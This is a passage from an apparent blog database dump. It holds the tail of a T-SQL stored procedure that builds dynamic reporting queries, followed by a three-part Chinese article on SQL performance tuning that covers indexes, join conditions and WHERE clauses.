#TG009(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>157&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;+ @groupby+&#39; VARCHAR(10) PRIMARY KEY NOT NULL,</p>\r\n\r\n<p>158&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT int null,</p>\r\n\r\n<p>159&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_TOTAL int null,</p>\r\n\r\n<p>160&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_PCT numeric(10,2)&nbsp; null,</p>\r\n\r\n<p>161&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_ELC_CEL_EXP numeric(10,2) null,</p>\r\n\r\n<p>162&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT1 int null,</p>\r\n\r\n<p>163&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT2 int null,</p>\r\n\r\n<p>164&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT2B int null</p>\r\n\r\n<p>165&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</p>\r\n\r\n<p>166&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT &#39;+ @groupby+&#39;,TE_CANCEL_FLAG,TE_WORKER_FLAG,TE_END_FLAG,TE_CANCEL_TIME INTO #temp1 FROM TG_ENTRY where&#39;+@sqlWhere+&#39; AND &#39;+@groupby+&#39; in ( select&nbsp; &#39;+ @groupby +&#39; from #PAGE where TID between &#39;+ convert(varchar(20),@START_ID)+ &#39; AND &#39;+ convert(varchar(20),@END_ID)+&#39;);</p>\r\n\r\n<p>167&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; INSERT INTO #TG009(</p>\r\n\r\n<p>168&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;+ @groupby+&#39;,</p>\r\n\r\n<p>169&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT,</p>\r\n\r\n<p>170&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_TOTAL,</p>\r\n\r\n<p>171&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_PCT,</p>\r\n\r\n<p>172&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_ELC_CEL_EXP,</p>\r\n\r\n<p>173&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT1,</p>\r\n\r\n<p>174&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT2,</p>\r\n\r\n<p>175&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT2B) &nbsp;</p>\r\n\r\n<p>176&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT a.&#39;+ @groupby+&#39;,</p>\r\n\r\n<p>177&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>178&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT SUM(TE_CANCEL_TIME) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>179&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; risk.HgDiv((SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),(SELECT COUNT(*) FROM #temp1 WHERE TE_END_FLAG = 1 AND TE_WORKER_FLAG = 0 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)),</p>\r\n\r\n<p>180&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; risk.HgDiv((SELECT SUM(TE_CANCEL_TIME) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0&nbsp; and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),(SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0&nbsp; and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)),</p>\r\n\r\n<p>181&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0 AND TE_CANCEL_TIME = 1 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>182&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0 AND TE_CANCEL_TIME = 2 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>183&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0 AND TE_CANCEL_TIME &gt; 2 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)</p>\r\n\r\n<p>184&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; from #temp1 a</p>\r\n\r\n<p>185&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; group by a.&#39;+ @groupby+&#39;;</p>\r\n\r\n<p>186&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DROP TABLE #temp1;</p>\r\n\r\n<p>187&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT * FROM #TG009;</p>\r\n\r\n<p>188&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DROP TABLE #TG009&#39;</p>\r\n\r\n<p>189&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>190&nbsp;&nbsp;&nbsp; else if&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @TE_MONI_T = &#39;2&#39;&nbsp;&nbsp;&nbsp; --现场拒单</p>\r\n\r\n<p>191&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sql = &#39;</p>\r\n\r\n<p>192&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; select top &#39;+convert(varchar(20),@END_ID)+ &#39; &#39;+ @groupby +&#39;,IDENTITY(int,1,1) AS TID into #PAGE&nbsp; from TG_ENTRY where &#39;+@sqlWhere +&#39; group by &#39;+@groupby+ &#39;;</p>\r\n\r\n<p>193&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CREATE TABLE #TG009(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>194&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;+ @groupby+&#39; VARCHAR(10) PRIMARY KEY NOT NULL,</p>\r\n\r\n<p>195&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_COUNT int null,</p>\r\n\r\n<p>196&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL int null,</p>\r\n\r\n<p>197&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_PCT numeric(10,2) null,</p>\r\n\r\n<p>198&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_SEC_EXP numeric(10,2) null,</p>\r\n\r\n<p>199&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL1&nbsp; int null,</p>\r\n\r\n<p>200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL2&nbsp; int null,</p>\r\n\r\n<p>201&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL2B&nbsp; int null</p>\r\n\r\n<p>202&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</p>\r\n\r\n<p>203&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT &#39;+ @groupby+&#39;,TE_SCENE_TIME,TE_CANCEL_FLAG,TE_SCENE_FLAG,TE_MEET_FLAG INTO #temp1 FROM TG_ENTRY where&#39;+@sqlWhere+&#39; AND &#39;+@groupby+&#39; in ( select&nbsp; &#39;+ @groupby +&#39; from #PAGE where TID between &#39;+ convert(varchar(20),@START_ID)+ &#39; AND &#39;+ convert(varchar(20),@END_ID)+&#39;);</p>\r\n\r\n<p>204&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; INSERT INTO #TG009(</p>\r\n\r\n<p>205&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;+ @groupby+&#39;,</p>\r\n\r\n<p>206&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_COUNT,</p>\r\n\r\n<p>207&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL,</p>\r\n\r\n<p>208&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_PCT,</p>\r\n\r\n<p>209&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_SEC_EXP,</p>\r\n\r\n<p>210&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL1,</p>\r\n\r\n<p>211&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL2,</p>\r\n\r\n<p>212&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL2B) &nbsp;</p>\r\n\r\n<p>213&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT a.&#39;+ @groupby+&#39;,</p>\r\n\r\n<p>214&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_SCENE_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>215&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT SUM(TE_SCENE_TIME) FROM #temp1 WHERE TE_SCENE_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>216&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; risk.HgDiv((SELECT SUM(TE_SCENE_TIME) FROM #temp1 WHERE TE_SCENE_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),(SELECT COUNT(*) FROM #temp1 WHERE TE_MEET_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)),</p>\r\n\r\n<p>217&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; risk.HgDiv((SELECT SUM(TE_SCENE_TIME) FROM #temp1 WHERE TE_SCENE_FLAG = 1&nbsp; and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),(SELECT COUNT(*) FROM #temp1 WHERE TE_SCENE_FLAG = 1&nbsp; and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)),</p>\r\n\r\n<p>218&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_SCENE_FLAG = 1 AND TE_SCENE_TIME = 1 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>219&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_SCENE_FLAG = 1 AND TE_SCENE_TIME = 2 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>220&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_SCENE_FLAG = 1 AND TE_SCENE_TIME &gt; 2 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)</p>\r\n\r\n<p>221&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; from #temp1 a</p>\r\n\r\n<p>222&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; group by a.&#39;+ @groupby+&#39;;</p>\r\n\r\n<p>223&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DROP TABLE #temp1;</p>\r\n\r\n<p>224&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT * FROM #TG009;</p>\r\n\r\n<p>225&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DROP TABLE #TG009&#39;</p>\r\n\r\n<p>226--print @sql</p>\r\n\r\n<p>227</p>\r\n\r\n<p>228exec(@sql)</p>\r\n\r\n<p>229</p>\r\n\r\n<p>230</p>\r\n\r\n<p>231</p>\r\n\r\n<p>232</p>\r\n\r\n<p>233</p>\r\n\r\n<p>234</p>\r\n\r\n<p>235SET NOCOUNT OFF</p>\r\n\r\n<p>236</p>\r\n\r\n<p>237</p>\r\n\r\n<p>238</p>\r\n\r\n<p>239</p>\r\n\r\n<p>240</p>\r\n\r\n<p>241GO</p>\r\n\r\n<p>242SET QUOTED_IDENTIFIER OFF &nbsp;</p>\r\n\r\n<p>243GO</p>\r\n\r\n<p>244SET ANSI_NULLS ON &nbsp;</p>\r\n\r\n<p>245GO</p>\r\n',0,1438008973,0,0),(95,24,'如何让你的百万级SQL运行得更快(上)','<p>人们在使用SQL时往往会陷入一个误区，即太关注于所得的结果是否正确，而忽略了不同的实现方法之间可能存在的性能差异，这种性能差异在大型的或是复杂的数据库环境中（如联机事务处理OLTP或决策支持系统DSS）中表现得尤为明显。笔者在工作实践中发现，不良的SQL往往来自于不恰当的索引设计、不充份的连接条件和不可优化的where子句。在对它们进行适当的优化后，其运行速度有了明显地提高！下面我将从这三个方面分别进行总结：</p>\r\n\r\n<p>为了更直观地说明问题，所有实例中的SQL运行时间均经过测试，不超过１秒的均表示为（&lt; 1秒）。</p>\r\n\r\n<p>测试环境--<br />\r\n主机：HP LH II<br />\r\n主频：330MHZ<br />\r\n内存：128兆<br />\r\n操作系统：Operserver5.0.4<br />\r\n数据库：Sybase11.0.3</p>\r\n\r\n<p>一、不合理的索引设计<br />\r\n例：表record有620000行，试看在不同的索引下，下面几个 SQL的运行情况：<br />\r\n1.在date上建有一非个群集索引<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19991201&#39; and date &lt; &#39;19991214&#39;and amount &gt;<br />\r\n2000 (25秒)<br />\r\nselect date,sum(amount) from record group by date<br />\r\n(55秒)<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19990901&#39; and place in (&#39;BJ&#39;,&#39;SH&#39;) (27秒)</p>\r\n\r\n<p>分析：<br />\r\ndate上有大量的重复值，在非群集索引下，数据在物理上随机存放在数据页上，在范围查找时，必须执行一次表扫描才能找到这一范围内的全部行。</p>\r\n\r\n<p>2.在date上的一个群集索引<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19991201&#39; and date &lt; &#39;19991214&#39; and amount &gt;<br />\r\n2000 （14秒）<br />\r\nselect date,sum(amount) from record group by date<br />\r\n（28秒）<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19990901&#39; and place in (&#39;BJ&#39;,&#39;SH&#39;)（14秒）</p>\r\n\r\n<p>分析：<br />\r\n在群集索引下，数据在物理上按顺序在数据页上，重复值也排列在一起，因而在范围查找时，可以先找到这个范围的起末点，且只在这个范围内扫描数据页，避免了大范围扫描，提高了查询速度。</p>\r\n\r\n<p>3.在place，date，amount上的组合索引<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19991201&#39; and date &lt; &#39;19991214&#39; and amount &gt;<br />\r\n2000 （26秒）<br />\r\nselect date,sum(amount) from record group by date<br />\r\n（27秒）<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19990901&#39; and place in (&#39;BJ, &#39;SH&#39;)（&lt; 1秒）</p>\r\n\r\n<p>分析：<br />\r\n这是一个不很合理的组合索引，因为它的前导列是place，第一和第二条SQL没有引用place，因此也没有利用上索引；第三个SQL使用了place，且引用的所有列都包含在组合索引中，形成了索引覆盖，所以它的速度是非常快的。</p>\r\n\r\n<p>4.在date，place，amount上的组合索引</p>\r\n\r\n<p>&nbsp;<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19991201&#39; and date &lt; &#39;19991214&#39; and amount &gt;<br />\r\n2000(&lt; 1秒)<br />\r\nselect date,sum(amount) from record group by date<br />\r\n（11秒）<br />\r\nselect count(*) from record where date &gt;<br />\r\n&#39;19990901&#39; and place in (&#39;BJ&#39;,&#39;SH&#39;)（&lt; 1秒）</p>\r\n\r\n<p>分析：<br />\r\n这是一个合理的组合索引。它将date作为前导列，使每个SQL都可以利用索引，并且在第一和第三个SQL中形成了索引覆盖，因而性能达到了最优。</p>\r\n\r\n<p>5.总结：</p>\r\n\r\n<p>缺省情况下建立的索引是非群集索引，但有时它并不是最佳的；合理的索引设计要建立在对各种查询的分析和预测上。一般来说：</p>\r\n\r\n<p>①.有大量重复值、且经常有范围查询</p>\r\n\r\n<p>（between, &gt;,&lt; ，&gt;=,&lt; =）和order by<br />\r\n、group by发生的列，可考虑建立群集索引；</p>\r\n\r\n<p>②.经常同时存取多列，且每列都含有重复值可考虑建立组合索引；</p>\r\n\r\n<p>③.组合索引要尽量使关键查询形成索引覆盖，其前导列一定是使用最频繁的列。</p>\r\n',0,1438067709,0,0),(96,24,'如何让你的百万级SQL运行得更快(中)','<p>二、不充份的连接条件：<br />\r\n例：表card有7896行，在card_no上有一个非聚集索引，表account有191122行，在 account_no上有一个非聚集索引，试看在不同的表连接条件下，两个SQL的执行情况：<br />\r\nselect sum(a.amount) from account a,<br />\r\ncard b where a.card_no = b.card_no（20秒）</p>\r\n\r\n<p>将SQL改为：<br />\r\nselect sum(a.amount) from account a,<br />\r\ncard b where a.card_no = b.card_no and a.<br />\r\naccount_no=b.account_no（&lt; 1秒）</p>\r\n\r\n<p>分析：<br />\r\n在第一个连接条件下，最佳查询方案是将account作外层表，card作内层表，利用card上的索引，其I/O次数可由以下公式估算为：</p>\r\n\r\n<p>外层表account上的22541页+（外层表account的191122行*内层表card上对应外层表第一行所要查找的3页）=595907次I/O</p>\r\n\r\n<p>在第二个连接条件下，最佳查询方案是将card作外层表，account作内层表，利用account上的索引，其I/O次数可由以下公式估算为：</p>\r\n\r\n<p>外层表card上的1944页+（外层表card的7896行*内层表account上对应外层表每一行所要查找的4页）= 33528次I/O</p>\r\n\r\n<p>可见，只有充份的连接条件，真正的最佳方案才会被执行。</p>\r\n\r\n<p>总结：</p>\r\n\r\n<p>1.多表操作在被实际执行前，查询优化器会根据连接条件，列出几组可能的连接方案并从中找出系统开销最小的最佳方案。连接条件要充份考虑带有索引的表、行数多的表；内外表的选择可由公式：外层表中的匹配行数*内层表中每一次查找的次数确定，乘积最小为最佳方案。</p>\r\n\r\n<p>2.查看执行方案的方法-- 用set showplanon，打开showplan选项，就可以看到连接顺序、使用何种索引的信息；想看更详细的信息，需用sa角色执行dbcc(3604,310,302)。</p>\r\n',0,1438067760,0,0),(97,24,'如何让你的百万级SQL运行得更快(下)','<p>三、不可优化的where子句<br />\r\n1.例：下列SQL条件语句中的列都建有恰当的索引，但执行速度却非常慢：<br />\r\nselect * from record where<br />\r\nsubstring(card_no,1,4)=&#39;5378&#39;(13秒)<br />\r\nselect * from record where<br />\r\namount/30&lt; 1000（11秒）<br />\r\nselect * from record where<br />\r\nconvert(char(10),date,112)=&#39;19991201&#39;（10秒）</p>\r\n\r\n<p>分析：<br />\r\nwhere子句中对列的任何操作结果都是在SQL运行时逐列计算得到的，因此它不得不进行表搜索，而没有使用该列上面的索引；如果这些结果在查询编译时就能得到，那么就可以被SQL优化器优化，使用索引，避免表搜索，因此将SQL重写成下面这样：<br />\r\nselect * from record where card_no like<br />\r\n&#39;5378%&#39;（&lt; 